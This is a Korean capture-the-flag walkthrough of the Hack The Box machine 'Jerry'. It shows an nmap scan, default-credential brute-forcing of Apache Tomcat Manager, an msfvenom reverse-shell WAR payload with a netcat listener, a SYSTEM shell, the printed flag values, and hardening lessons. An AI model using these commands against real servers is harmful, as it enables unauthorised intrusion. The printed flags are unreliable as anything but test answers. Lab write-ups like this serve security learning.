# HTB - Jerry

## 머신 정보

|항목|내용|
|---|---|
|이름|Jerry|
|난이도|Easy|
|OS|Windows|
|IP|10.129.136.9|
|취약점|Tomcat 기본 크레덴셜 + WAR 파일 업로드|
|태그|`Tomcat` `DefaultCredentials` `WAR` `Java` `Windows`|

---

## 공격 흐름 요약

```
nmap 포트 스캔
→ 8080 포트 (Apache Tomcat)
→ 기본 크레덴셜 (tomcat:s3cret)
→ Tomcat Manager 로그인
→ 악성 WAR 파일 업로드
→ 리버스쉘 획득
→ SYSTEM 권한 (Privesc 불필요)
→ 두 Flag 동시 획득
```

---

## 1. 정찰 (Reconnaissance)

### 1.1 Nmap 포트 스캔

```bash
nmap -p- --min-rate 10000 -T4 10.129.136.9
```

**결과:**

|PORT|STATE|SERVICE|
|---|---|---|
|8080/tcp|open|http-proxy|

> 포트 하나만 열려있음. 8080 = Apache Tomcat 기본 포트

### 1.2 서비스 버전 확인

```bash
nmap -sV -p 8080 10.129.136.9
```

→ **Apache Tomcat 7.0.88** 확인

### 1.3 웹 서비스 확인

브라우저에서:

```
http://10.129.136.9:8080/
```

→ Apache Tomcat 기본 페이지 확인

### 1.4 Tomcat Manager 경로

```
http://10.129.136.9:8080/manager/html
```

→ Basic Auth 팝업 확인

---

## 2. 초기 접근 (Initial Access)

### 2.1 기본 크레덴셜 브루트포스

Metasploit으로 확인:

```bash
msfconsole
use auxiliary/scanner/http/tomcat_mgr_login
set RHOSTS 10.129.136.9
set RPORT 8080
run
```

또는 직접 시도:

|계정|결과|
|---|---|
|admin:admin|❌|
|admin:password|❌|
|tomcat:tomcat|❌|
|**tomcat:s3cret**|✅|

### 2.2 Tomcat Manager 로그인

```
URL: http://10.129.136.9:8080/manager/html
ID:  tomcat
PW:  s3cret
```

### 2.3 악성 WAR 파일 생성

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.17.240 LPORT=4444 -f war > shell.war
```

### 2.4 nc 리스너 실행

```bash
nc -lvnp 4444
```

### 2.5 WAR 파일 업로드 및 배포

Tomcat Manager 페이지:

```
→ "WAR file to deploy" 섹션
→ shell.war 선택
→ Deploy 클릭
```

배포 성공하면 `/shell` 애플리케이션이 목록에 추가됨.

### 2.6 웹쉘 트리거

브라우저에서:

```
http://10.129.136.9:8080/shell/
```

→ **nc에 리버스쉘 연결!**

```
C:\apache-tomcat-7.0.88> whoami
nt authority\system
```

> Tomcat이 SYSTEM 권한으로 실행 중 → Privilege Escalation 불필요!

---

## 3. Flag 획득

Jerry는 특이하게 **User Flag와 Root Flag가 하나의 파일에 존재**!

### Flag 파일 위치 확인

```bash
dir C:\Users\Administrator\Desktop\flags\
```

```
2 for the price of 1.txt
```

### Flag 읽기

```bash
type "C:\Users\Administrator\Desktop\flags\2 for the price of 1.txt"
```

**결과:**

```
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90e
```

---

## 4. 정리 및 교훈

### 취약점 체인

```
Apache Tomcat 노출 (8080)
→ 기본 크레덴셜 미변경 (tomcat:s3cret)
→ Manager 페이지 접근 가능
→ WAR 업로드 기능 악용
→ SYSTEM 권한 쉘 획득
```

### 핵심 교훈

- **기본 크레덴셜 변경 필수** - tomcat:s3cret은 공개된 기본값
- **Manager 페이지 외부 노출 금지** - 방화벽으로 접근 제한 필요
- **최소 권한 원칙** - Tomcat을 SYSTEM으로 실행하면 안됨
- **WAR 업로드 기능** = 사실상 원격 코드 실행 기능

### Jerry가 쉬운 이유

1. 포트가 8080 하나뿐 → 공격 표면 명확
2. 기본 크레덴셜 → 인증 우회 쉬움
3. SYSTEM으로 실행 → Privesc 불필요
4. User/Root Flag 동시 획득 → 한 번에 끝

---

## 참고

|항목|링크|
|---|---|
|Apache Tomcat|https://tomcat.apache.org|
|Tomcat Manager 보안 가이드|https://tomcat.apache.org/tomcat-7.0-doc/manager-howto.html|
|Exploit-DB WAR 업로드|https://www.exploit-db.com/exploits/31433|